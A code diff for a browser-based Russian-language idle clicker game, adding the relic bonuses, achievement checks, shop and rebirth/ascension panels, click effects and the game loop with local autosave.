+  function relicDpsMult(){ return 1 + (state.relics.r3 ? 0.5 : 0) + (state.relics.r10 ? 2.0 : 0); }
+  function relicFarmMult(){ return 1 + (state.relics.r2 ? 0.5 : 0); }
+  function relicCritBonus(){ return state.relics.r4 ? 0.10 : 0; }
+  function relicOfflineBonus(){ return state.relics.r5 ? 0.5 : 0; }
+  function relicCrystalGainBonus(){ return state.relics.r8 ? 0.5 : 0; }
+  function relicStarGainBonus(){ return state.relics.r6 ? 0.25 : 0; }
+
+  function flatClickBonus() {
+    let sum = 0;
+    clickTierUpgrades.forEach(u => { if (state[u.id]) sum += u.powerAdd; });
+    return sum;
+  }
+  function flatAutoBonus() {
+    let sum = 0;
+    autoTierUpgrades.forEach(u => { if (state[u.id]) sum += u.dpsAdd; });
+    return sum;
+  }
+  function farmsIncome() {
+    let sum = 0;
+    farms.forEach(f => { sum += (state.farms[f.key]||0) * f.income; });
+    return sum * relicFarmMult();
+  }
+  function totalFarmsOwned() {
+    let sum = 0;
+    farms.forEach(f => { sum += (state.farms[f.key]||0); });
+    return sum;
+  }
+
+  function globalMult() {
+    return state.multiplier * batteryBonus() * overclockBonus() * prestigeMult() * achievementMult() * relicBonusAll();
+  }
+
+  function getEffectiveClickPower() {
+    const base = state.clickPower + flatClickBonus();
+    const mult = globalMult();
+    const boosted = state.boostEndTime > Date.now() ? state.boostMultiplier : 1;
+    return base * mult * boosted * relicClickMult();
+  }
+
+  function getEffectiveDps() {
+    const base = state.autoPerSec + flatAutoBonus() + farmsIncome();
+    const mult = globalMult();
+    const boosted = state.boostEndTime > Date.now() ? state.boostMultiplier : 1;
+    return base * mult * boosted * relicDpsMult();
+  }
+
+  function getCritChance(){
+    return Math.min(0.9, state.specials.crit*0.03 + relicCritBonus());
+  }
+
+  function applyRelicStartBonuses(){
+    if (state.relics.r1) state.clickPower += 10;
+  }
+
+  function showToast(msg) {
+    const t = document.getElementById("toast");
+    t.textContent = msg;
+    t.classList.add("show");
+    clearTimeout(showToast._timer);
+    showToast._timer = setTimeout(()=> t.classList.remove("show"), 2200);
+  }
+
+  /* ================= ACHIEVEMENTS ================= */
+
+  function computeAchievementContext() {
+    return {
+      totalFarms: totalFarmsOwned(),
+      dps: getEffectiveDps(),
+      allClick: clickTierUpgrades.every(u => !!state[u.id]),
+      allAuto: autoTierUpgrades.every(u => !!state[u.id]),
+      allMulti: multiUpgrades.every(u => state.multipliersBought[u.key] >= u.maxLevel),
+      relicCount: relicsData.filter(r => state.relics[r.id]).length,
+      allRelics: relicsData.every(r => state.relics[r.id])
+    };
+  }
+
+  function checkAchievements() {
+    const ctx = computeAchievementContext();
+    let unlockedNew = false;
+    achievementsData.forEach(a => {
+      if (!state.achievements[a.id] && a.check(state, ctx)) {
+        state.achievements[a.id] = true;
+        unlockedNew = true;
+        showToast(`Достижение: ${a.name}`);
+      }
+    });
+    if (unlockedNew) {
+      save();
+      if (currentPanel === "achievements") renderPanel("achievements");
+      renderStats();
     }
-});
+  }
 
-console.log('🛡️ Система защиты загружена');
+  /* ================= UI REFS ================= */
+
+  const currencyEl = document.getElementById("currency");
+  const statClick = document.getElementById("stat-click");
+  const statDps = document.getElementById("stat-dps");
+  const statTotal = document.getElementById("stat-total");
+  const statStars = document.getElementById("stat-stars");
+  const statPrestigeMult = document.getElementById("stat-prestige-mult");
+  const statCrystals = document.getElementById("stat-crystals");
+  const statAscendCount = document.getElementById("stat-ascend-count");
+  const ascendRow = document.getElementById("ascend-row");
+  const clickBtn = document.getElementById("click-btn");
+  const clickArea = document.getElementById("click-area");
+  const panels = document.getElementById("panels");
+  const panelTitle = document.getElementById("panel-title");
+  const panelContent = document.getElementById("panel-content");
+  const boostBanner = document.getElementById("boost-banner");
+  const capClick = document.getElementById("cap-click");
+  const capDps = document.getElementById("cap-dps");
+  const capMult = document.getElementById("cap-mult");
+  const capCrit = document.getElementById("cap-crit");
+
+  let currentPanel = null;
+  // panels that show live-updating shop data and are safe to auto-refresh while open.
+  // "faq" and "profile" are intentionally excluded so open FAQ answers don't get force-collapsed.
+  const AUTO_REFRESH_PANELS = ["damage","auto","farms","boosts","relics","rebirth","ascension","achievements"];
+
+  /* ================= RENDER ================= */
+
+  function renderStats() {
+    currencyEl.textContent = formatNum(state.currency);
+    statClick.textContent = formatNum(getEffectiveClickPower());
+    statDps.textContent = formatNum(getEffectiveDps());
+    statTotal.textContent = formatNum(state.totalEarned);
+    statStars.textContent = state.prestigeStars;
+    statPrestigeMult.textContent = prestigeMult().toFixed(1);
+    statCrystals.textContent = state.ascensionCrystals;
+    statAscendCount.textContent = state.ascensionCount;
+    ascendRow.classList.toggle("show", state.ascensionCrystals > 0 || state.ascensionCount > 0);
+
+    capClick.innerHTML = iconHtml("sword") + " <b>" + formatNum(getEffectiveClickPower()) + "</b>";
+    capDps.innerHTML = iconHtml("robot") + " <b>" + formatNum(getEffectiveDps()) + "</b>";
+    capMult.innerHTML = iconHtml("star") + " <b>x" + globalMult().toFixed(1) + "</b>";
+    capCrit.innerHTML = iconHtml("dagger") + " <b>" + Math.round(getCritChance()*100) + "%</b>";
+
+    if (state.boostEndTime > Date.now()) {
+      boostBanner.style.display = "flex";
+      const secLeft = Math.ceil((state.boostEndTime - Date.now())/1000);
+      boostBanner.innerHTML = iconHtml("turbo") + ` БУСТ x${state.boostMultiplier} — ${secLeft}с`;
+    } else {
+      boostBanner.style.display = "none";
+    }
+  }
+
+  function buildShopItem({icon, title, desc, cost, onBuy, maxed, locked}) {
+    const div = document.createElement("div");
+    const affordable = !maxed && !locked && cost !== null && state.currency >= cost;
+    div.className = "shop-item" + (affordable ? " affordable" : "");
+    if (locked) div.style.opacity = "0.5";
+    div.innerHTML = `
+      <div class="shop-icon">${iconHtml(icon)}</div>
+      <div class="shop-info">
+        <div class="shop-title">${title}</div>
+        <div class="shop-desc">${desc}</div>
+      </div>
+      <div class="shop-buy-btn ${affordable ? "" : "disabled"}">${maxed ? "МАКС" : locked ? iconHtml("lock") : formatNum(cost)}</div>
+    `;
+    if (!maxed && !locked) {
+      div.addEventListener("click", () => {
+        if (state.currency >= cost) {
+          onBuy(cost);
+          div.classList.add("bought-flash");
+          save();
+          checkAchievements();
+          if (currentPanel) renderPanel(currentPanel);
+          renderStats();
+        } else {
+          showToast("Недостаточно валюты!");
+        }
+      });
+    } else if (locked) {
+      div.addEventListener("click", () => showToast("Сначала откройте требуемый уровень!"));
+    }
+    return div;
+  }
+
+  function buildRelicItem(r) {
+    const bought = !!state.relics[r.id];
+    const affordable = !bought && state.ascensionCrystals >= r.cost;
+    const div = document.createElement("div");
+    div.className = "shop-item" + (affordable ? " affordable" : "");
+    div.innerHTML = `
+      <div class="shop-icon">${iconHtml(r.icon)}</div>
+      <div class="shop-info">
+        <div class="shop-title">${r.name}</div>
+        <div class="shop-desc">${r.desc}</div>
+      </div>
+      <div class="shop-buy-btn ${affordable ? "" : "disabled"}">${bought ? iconHtml("check") : (iconHtml("gem") + " " + r.cost)}</div>
+    `;
+    if (!bought) {
+      div.addEventListener("click", () => {
+        if (state.ascensionCrystals >= r.cost) {
+          state.ascensionCrystals -= r.cost;
+          state.relics[r.id] = true;
+          div.classList.add("bought-flash");
+          save();
+          checkAchievements();
+          if (currentPanel === "relics") renderPanel("relics");
+          renderStats();
+          showToast(`Реликвия получена: ${r.name}`);
+        } else {
+          showToast("Недостаточно кристаллов вознесения!");
+        }
+      });
+    }
+    return div;
+  }
+
+  function renderPanel(kind) {
+    panelContent.innerHTML = "";
+
+    if (kind === "damage") {
+      panelTitle.innerHTML = iconHtml("sword") + " Урон за клик";
+      panelContent.appendChild(buildShopItem({
+        icon: clickUpgrade.icon, title: clickUpgrade.name, desc: clickUpgrade.desc(state.clickLevel),
+        cost: costFor(clickUpgrade.baseCost, clickUpgrade.growth, state.clickLevel),
+        onBuy: (cost) => { state.currency -= cost; state.clickLevel++; state.clickPower *= clickUpgrade.powerMult; }
+      }));
+      const label = document.createElement("div");
+      label.className = "section-label";
+      label.textContent = "— Мощные улучшения (разовые) —";
+      panelContent.appendChild(label);
+      clickTierUpgrades.forEach(u => {
+        const bought = !!state[u.id];
+        const locked = !bought && state.clickLevel < u.req;
+        panelContent.appendChild(buildShopItem({
+          icon: u.icon, title: u.name,
+          desc: locked ? `Требуется уровень удара ${u.req} (сейчас ${state.clickLevel})` : u.desc,
+          cost: u.cost, maxed: bought, locked,
+          onBuy: (cost) => { state.currency -= cost; state[u.id] = true; }
+        }));
+      });
+    }
+
+    else if (kind === "auto") {
+      panelTitle.innerHTML = iconHtml("robot") + " Автоклики";
+      panelContent.appendChild(buildShopItem({
+        icon: autoUpgrade.icon, title: autoUpgrade.name, desc: autoUpgrade.desc(state.autoLevel),
+        cost: costFor(autoUpgrade.baseCost, autoUpgrade.growth, state.autoLevel),
+        onBuy: (cost) => { state.currency -= cost; state.autoLevel++; state.autoPerSec += autoUpgrade.gain; }
+      }));
+      const label = document.createElement("div");
+      label.className = "section-label";
+      label.textContent = "— Мощные улучшения (разовые) —";
+      panelContent.appendChild(label);
+      autoTierUpgrades.forEach(u => {
+        const bought = !!state[u.id];
+        const locked = !bought && state.autoLevel < u.req;
+        panelContent.appendChild(buildShopItem({
+          icon: u.icon, title: u.name,
+          desc: locked ? `Требуется уровень авто ${u.req} (сейчас ${state.autoLevel})` : u.desc,
+          cost: u.cost, maxed: bought, locked,
+          onBuy: (cost) => { state.currency -= cost; state[u.id] = true; }
+        }));
+      });
+    }
+
+    else if (kind === "farms") {
+      panelTitle.innerHTML = iconHtml("house") + " Фермы";
+      const label = document.createElement("div");
+      label.className = "section-label";
+      label.textContent = "Покупайте фермы для постоянного пассивного дохода";
+      panelContent.appendChild(label);
+      farms.forEach(f => {
+        const count = state.farms[f.key] || 0;
+        const cost = costFor(f.baseCost, f.growth, count);
+        panelContent.appendChild(buildShopItem({
+          icon: f.icon, title: `${f.name} (x${count})`,
+          desc: `${f.desc} • +${formatNum(f.income)}/сек за штуку`,
+          cost,
+          onBuy: (c) => { state.currency -= c; state.farms[f.key] = count + 1; }
+        }));
+      });
+    }
+
+    else if (kind === "boosts") {
+      panelTitle.innerHTML = iconHtml("sparkles") + " Бонусные множители";
+      multiUpgrades.forEach(u => {
+        const lvl = state.multipliersBought[u.key];
+        const maxed = lvl >= u.maxLevel;
+        panelContent.appendChild(buildShopItem({
+          icon: u.icon, title: u.name,
+          desc: maxed ? "Куплено" : `Множитель всей валюты x${u.factor} навсегда`,
+          cost: maxed ? null : u.baseCost, maxed,
+          onBuy: (cost) => { state.currency -= cost; state.multipliersBought[u.key] = 1; state.multiplier *= u.factor; }
+        }));
+      });
+      const divider = document.createElement("div");
+      divider.className = "section-label";
+      divider.textContent = "— Специальные умения —";
+      panelContent.appendChild(divider);
+      specialUpgrades.forEach(u => {
+        const lvl = state.specials[u.key];
+        const maxed = lvl >= u.maxLevel;
+        panelContent.appendChild(buildShopItem({
+          icon: u.icon, title: u.name, desc: u.desc(lvl),
+          cost: maxed ? null : costFor(u.baseCost, u.growth, lvl), maxed,
+          onBuy: (cost) => { state.currency -= cost; state.specials[u.key]++; }
+        }));
+      });
+    }
+
+    else if (kind === "relics") {
+      panelTitle.innerHTML = iconHtml("gem") + " Реликвии вознесения";
+      const label = document.createElement("div");
+      label.className = "section-label";
+      label.textContent = `У вас ${state.ascensionCrystals} кристаллов вознесения. Реликвии не сбрасываются никогда.`;
+      panelContent.appendChild(label);
+      relicsData.forEach(r => panelContent.appendChild(buildRelicItem(r)));
+    }
+
+    else if (kind === "rebirth") {
+      panelTitle.innerHTML = iconHtml("refresh") + " Перерождение";
+      const potentialStars = Math.floor(Math.sqrt(state.totalEarned / 100000000) * (1 + relicStarGainBonus()));
+      const box = document.createElement("div");
+      box.className = "rebirth-box";
+      box.innerHTML = `
+        <div class="rebirth-icon-big">${iconHtml("refresh")}</div>
+        <div style="font-size:0.85em;color:var(--text-dim);margin-top:6px;">Текущие звёзды</div>
+        <div class="rebirth-stars">${iconHtml("star")} ${state.prestigeStars}</div>
+        <div style="font-size:0.8em;color:var(--text-dim);">Постоянный бонус: <b style="color:var(--gold-prestige)">x${prestigeMult().toFixed(1)}</b> ко всей валюте</div>
+        <div style="margin-top:14px;font-size:0.85em;color:var(--text-dim);">При перерождении сейчас вы получите:</div>
+        <div class="rebirth-stars" style="font-size:1.6em;">+${potentialStars} ${iconHtml("star")}</div>
+        <button class="rebirth-btn ${potentialStars < 1 ? 'disabled' : ''}" id="do-rebirth">Переродиться</button>
+        <div class="rebirth-info">
+          Перерождение сбросит вашу валюту, улучшения и фермы, но звёзды, достижения, реликвии и кристаллы вознесения остаются НАВСЕГДА.<br><br>
+          Формула: звёзды = √(всего заработано ÷ 100,000,000)<br>
+          При 40+ звёздах откроется Вознесение — второй уровень прогресса.
+        </div>
+      `;
+      panelContent.appendChild(box);
+      document.getElementById("do-rebirth").addEventListener("click", () => {
+        if (potentialStars < 1) { showToast("Заработайте больше валюты перед перерождением!"); return; }
+        if (confirm(`Переродиться и получить +${potentialStars} звёзд? Валюта, улучшения и фермы будут сброшены!`)) {
+          const newStars = state.prestigeStars + potentialStars;
+          const keep = keepMetaProgress();
+          state = JSON.parse(JSON.stringify(defaultState));
+          restoreMetaProgress(keep);
+          state.prestigeStars = newStars;
+          applyRelicStartBonuses();
+          save();
+          renderPanel("rebirth");
+          renderStats();
+          showToast(`Перерождение успешно! Теперь у вас ${newStars} звёзд!`);
+        }
+      });
+    }
+
+    else if (kind === "ascension") {
+      panelTitle.innerHTML = iconHtml("portal") + " Вознесение";
+      const ASCEND_REQ = 40;
+      const crystalsGain = Math.floor(state.prestigeStars/10 * (1+relicCrystalGainBonus()));
+      const locked = state.prestigeStars < ASCEND_REQ;
+      const box = document.createElement("div");
+      box.className = "rebirth-box";
+      box.innerHTML = `
+        <div class="rebirth-icon-big ascend">${iconHtml("portal")}</div>
+        <div style="font-size:0.85em;color:var(--text-dim);margin-top:6px;">Кристаллы вознесения</div>
+        <div class="rebirth-stars ascend">${iconHtml("gem")} ${state.ascensionCrystals}</div>
+        <div style="font-size:0.8em;color:var(--text-dim);">Вознесений совершено: <b style="color:var(--violet-ascend)">${state.ascensionCount}</b></div>
+        <div style="margin-top:14px;font-size:0.85em;color:var(--text-dim);">
+          ${locked ? `Требуется ${ASCEND_REQ} звёзд перерождения (сейчас ${state.prestigeStars})` : "При вознесении сейчас вы получите:"}
+        </div>
+        ${locked ? "" : `<div class="rebirth-stars ascend" style="font-size:1.6em;">+${crystalsGain} ${iconHtml("gem")}</div>`}
+        <button class="rebirth-btn ascend ${locked || crystalsGain < 1 ? 'disabled' : ''}" id="do-ascend">Вознестись</button>
+        <div class="rebirth-info">
+          Вознесение сбрасывает звёзды перерождения (и всё, что сбрасывает перерождение) в обмен на Кристаллы Вознесения.<br><br>
+          Кристаллы тратятся на Реликвии во вкладке 'Реликвии' — они остаются НАВСЕГДА, даже после следующих вознесений.<br><br>
+          Формула: кристаллы = звёзды ÷ 10
+        </div>
+      `;
+      panelContent.appendChild(box);
+      const btn = document.getElementById("do-ascend");
+      if (!locked) {
+        btn.addEventListener("click", () => {
+          if (crystalsGain < 1) { showToast("Наберите больше звёзд перед вознесением!"); return; }
+          if (confirm(`Вознестись и получить +${crystalsGain} кристаллов? Все звёзды перерождения будут сброшены!`)) {
+            const gained = crystalsGain;
+            const keep = keepMetaProgress();
+            state = JSON.parse(JSON.stringify(defaultState));
+            restoreMetaProgress(keep);
+            state.ascensionCrystals = keep.ascensionCrystals + gained;
+            state.ascensionCount = keep.ascensionCount + 1;
+            applyRelicStartBonuses();
+            save();
+            renderPanel("ascension");
+            renderStats();
+            showToast(`Вознесение успешно! Получено +${gained} кристаллов!`);
+          }
+        });
+      }
+    }
+
+    else if (kind === "achievements") {
+      panelTitle.innerHTML = iconHtml("trophy") + " Достижения";
+      const unlockedCount = achievementsData.filter(a => state.achievements[a.id]).length;
+      const summary = document.createElement("div");
+      summary.className = "section-label";
+      summary.textContent = `Открыто ${unlockedCount} из ${achievementsData.length} • Общий бонус: +${Math.round((achievementMult()-1)*100)}%`;
+      panelContent.appendChild(summary);
+      achievementsData.forEach(a => {
+        const unlocked = !!state.achievements[a.id];
+        const div = document.createElement("div");
+        div.className = "shop-item" + (unlocked ? " affordable" : "");
+        div.style.opacity = unlocked ? "1" : "0.55";
+        div.innerHTML = `
+          <div class="shop-icon">${iconHtml(unlocked ? a.icon : "lock")}</div>
+          <div class="shop-info">
+            <div class="shop-title">${a.name}</div>
+            <div class="shop-desc">${a.desc} • +${Math.round(a.bonus*100)}% ко всему</div>
+          </div>
+          <div class="shop-buy-btn ${unlocked ? "" : "disabled"}">${unlocked ? iconHtml("check") : iconHtml("lock")}</div>
+        `;
+        panelContent.appendChild(div);
+      });
+    }
+
+    else if (kind === "profile") {
+      panelTitle.innerHTML = iconHtml("user") + " Профиль";
+      const wrap = document.createElement("div");
+      wrap.id = "profile-content";
+      const playedSince = new Date(state.createdAt).toLocaleDateString('ru-RU');
+      wrap.innerHTML = `
+        <div class="profile-card">
+          <div class="profile-stat-row"><span>Текущая валюта</span><b>${formatNum(state.currency)}</b></div>
+          <div class="profile-stat-row"><span>Всего заработано</span><b>${formatNum(state.totalEarned)}</b></div>
+          <div class="profile-stat-row"><span>Всего кликов</span><b>${state.totalClicks}</b></div>
+          <div class="profile-stat-row"><span>Критических ударов</span><b>${state.totalCrits}</b></div>
+          <div class="profile-stat-row"><span>Урон за клик</span><b>${formatNum(getEffectiveClickPower())}</b></div>
+          <div class="profile-stat-row"><span>Доход в секунду</span><b>${formatNum(getEffectiveDps())}</b></div>
+          <div class="profile-stat-row"><span>Звёзды перерождения</span><b>${state.prestigeStars}</b></div>
+          <div class="profile-stat-row"><span>Кристаллы вознесения</span><b>${state.ascensionCrystals}</b></div>
+          <div class="profile-stat-row"><span>Вознесений совершено</span><b>${state.ascensionCount}</b></div>
+          <div class="profile-stat-row"><span>Реликвий получено</span><b>${relicsData.filter(r=>state.relics[r.id]).length}/${relicsData.length}</b></div>
+          <div class="profile-stat-row"><span>Серия входов подряд</span><b>${state.loginStreak} дн.</b></div>
+          <div class="profile-stat-row"><span>Достижения</span><b>${achievementsData.filter(a=>state.achievements[a.id]).length}/${achievementsData.length}</b></div>
+          <div class="profile-stat-row" style="border-bottom:none;"><span>Игра с</span><b>${playedSince}</b></div>
+        </div>
+        <button class="settings-btn" id="faq-btn">${iconHtml("question")} FAQ — как играть</button>
+        <button class="settings-btn" id="hardsave-btn">${iconHtml("save")} Сохранить сейчас</button>
+        <button class="settings-btn" id="reset-btn">${iconHtml("trash")} Сбросить игру полностью</button>
+      `;
+      panelContent.appendChild(wrap);
+      wrap.querySelector("#hardsave-btn").addEventListener("click", () => { save(); showToast("Игра сохранена!"); });
+      wrap.querySelector("#reset-btn").addEventListener("click", () => {
+        if (confirm("Точно сбросить ВЕСЬ прогресс, включая звёзды, реликвии и достижения? Это необратимо!")) {
+          localStorage.removeItem(SAVE_KEY);
+          location.reload();
+        }
+      });
+      wrap.querySelector("#faq-btn").addEventListener("click", () => {
+        currentPanel = "faq";
+        renderPanel("faq");
+      });
+    }
+
+    else if (kind === "faq") {
+      panelTitle.innerHTML = iconHtml("question") + " FAQ";
+      const backBtn = document.createElement("button");
+      backBtn.className = "settings-btn";
+      backBtn.textContent = "← Назад в профиль";
+      backBtn.addEventListener("click", () => {
+        currentPanel = "profile";
+        renderPanel("profile");
+      });
+      panelContent.appendChild(backBtn);
+      faqData.forEach((item) => {
+        const div = document.createElement("div");
+        div.className = "faq-item";
+        div.innerHTML = `
+          <div class="faq-q">${item.q}<span class="faq-arrow">▾</span></div>
+          <div class="faq-a">${item.a}</div>
+        `;
+        const q = div.querySelector(".faq-q");
+        const a = div.querySelector(".faq-a");
+        const arrow = div.querySelector(".faq-arrow");
+        q.addEventListener("click", () => {
+          const isOpen = a.classList.contains("open");
+          a.classList.toggle("open", !isOpen);
+          arrow.classList.toggle("open", !isOpen);
+        });
+        panelContent.appendChild(div);
+      });
+    }
+  }
+
+  /* ================= META PROGRESS HELPERS (rebirth / ascension) ================= */
+
+  function keepMetaProgress(){
+    return {
+      achievements: state.achievements,
+      relics: state.relics,
+      ascensionCrystals: state.ascensionCrystals,
+      ascensionCount: state.ascensionCount,
+      totalCrits: state.totalCrits,
+      totalBoosts: state.totalBoosts,
+      loginStreak: state.loginStreak,
+      lastLoginDay: state.lastLoginDay,
+      createdAt: state.createdAt
+    };
+  }
+  function restoreMetaProgress(keep){
+    state.achievements = keep.achievements;
+    state.relics = keep.relics;
+    state.ascensionCrystals = keep.ascensionCrystals;
+    state.ascensionCount = keep.ascensionCount;
+    state.totalCrits = keep.totalCrits;
+    state.totalBoosts = keep.totalBoosts;
+    state.loginStreak = keep.loginStreak;
+    state.lastLoginDay = keep.lastLoginDay;
+    state.createdAt = keep.createdAt;
+  }
+
+  /* ================= CLICK LOGIC ================= */
+
+  function spawnFloatNumber(x, y, amount, isCrit) {
+    const el = document.createElement("div");
+    el.className = "float-num" + (isCrit ? " crit" : "");
+    el.textContent = (isCrit ? "КРИТ! +" : "+") + formatNum(amount);
+    el.style.left = x + "px";
+    el.style.top = y + "px";
+    clickArea.appendChild(el);
+    setTimeout(() => el.remove(), 900);
+  }
+
+  function spawnParticles(x, y, isCrit) {
+    const colors = isCrit ? ["#c084fc", "#ff3b1f", "#ffd166", "#fff"] : ["#ff6a2d", "#ffb347", "#ff3b1f", "#ffd166"];
+    const count = isCrit ? 18 : 10;
+    for (let i = 0; i < count; i++) {
+      const p = document.createElement("div");
+      p.className = "particle";
+      const angle = Math.random() * Math.PI * 2;
+      const dist = 40 + Math.random() * 60;
+      p.style.setProperty("--dx", Math.cos(angle) * dist + "px");
+      p.style.setProperty("--dy", Math.sin(angle) * dist + "px");
+      p.style.left = x + "px";
+      p.style.top = y + "px";
+      p.style.background = colors[i % colors.length];
+      clickArea.appendChild(p);
+      setTimeout(() => p.remove(), 650);
+    }
+  }
+
+  function handleClick(clientX, clientY) {
+    const rect = clickArea.getBoundingClientRect();
+    const x = clientX - rect.left;
+    const y = clientY - rect.top;
+
+    let gain = getEffectiveClickPower();
+    let isCrit = false;
+    const critChance = getCritChance();
+    if (critChance > 0 && Math.random() < critChance) {
+      gain *= 10;
+      isCrit = true;
+      state.totalCrits++;
+    }
+
+    state.currency += gain;
+    state.totalEarned += gain;
+    state.totalClicks++;
+
+    spawnFloatNumber(x, y - 20, gain, isCrit);
+    spawnParticles(x, y, isCrit);
+
+    if (state.specials.accel > 0) {
+      const chance = state.specials.accel * 0.03;
+      if (Math.random() < chance) {
+        state.boostEndTime = Date.now() + 10000;
+        state.boostMultiplier = 3;
+        state.totalBoosts++;
+        showToast("Ускоритель активирован! x3 на 10 секунд!");
+      }
+    }
+
+    clickBtn.style.transform = "scale(0.9)";
+    setTimeout(() => clickBtn.style.transform = "", 90);
+
+    renderStats();
+    checkAchievements();
+  }
+
+  /* ================= TABS / PANELS ================= */
+
+  function initGame() {
+    load();
+    applyRelicStartBonuses();
+    renderStats();
+
+    clickBtn.addEventListener("click", (e) => { handleClick(e.clientX, e.clientY); });
+    clickBtn.addEventListener("touchstart", (e) => {
+      e.preventDefault();
+      const touch = e.changedTouches[0];
+      handleClick(touch.clientX, touch.clientY);
+    }, {passive:false});
+
+    document.querySelectorAll(".tab-btn").forEach(btn => {
+      btn.addEventListener("click", () => {
+        document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
+        btn.classList.add("active");
+        currentPanel = btn.dataset.panel;
+        renderPanel(currentPanel);
+        panels.classList.add("visible");
+      });
+    });
+
+    document.getElementById("close-panel").addEventListener("click", () => {
+      panels.classList.remove("visible");
+      document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
+      currentPanel = null;
+    });
+
+    let lastTick = Date.now();
+    let panelRefreshAccum = 0;
+    function gameLoop() {
+      const now = Date.now();
+      const dt = (now - lastTick) / 1000;
+      lastTick = now;
+
+      const dps = getEffectiveDps();
+      if (dps > 0) {
+        const gained = dps * dt;
+        state.currency += gained;
+        state.totalEarned += gained;
+      }
+
+      renderStats();
+
+      panelRefreshAccum += dt;
+      if (panelRefreshAccum > 0.5) {
+        panelRefreshAccum = 0;
+        checkAchievements();
+        // Only auto-refresh panels with no internal toggle state (FAQ is excluded on purpose,
+        // otherwise re-rendering every tick would force-close open FAQ answers).
+        if (currentPanel && panels.classList.contains("visible") && AUTO_REFRESH_PANELS.indexOf(currentPanel) !== -1) {
+          renderPanel(currentPanel);
+        }
+      }
+
+      requestAnimationFrame(gameLoop);
+    }
+    requestAnimationFrame(gameLoop);
+
+    setInterval(save, 1000);
+
+    document.addEventListener("gesturestart", e => e.preventDefault());
+    let lastTouchEnd = 0;
+    document.addEventListener("touchend", (e) => {
+      const now = Date.now();
+      if (now - lastTouchEnd <= 300) e.preventDefault();
+      lastTouchEnd = now;
+    }, false);
+
+    window.addEventListener("beforeunload", save);
+  }
+
+})();
 </script>
 </body>
 </html>
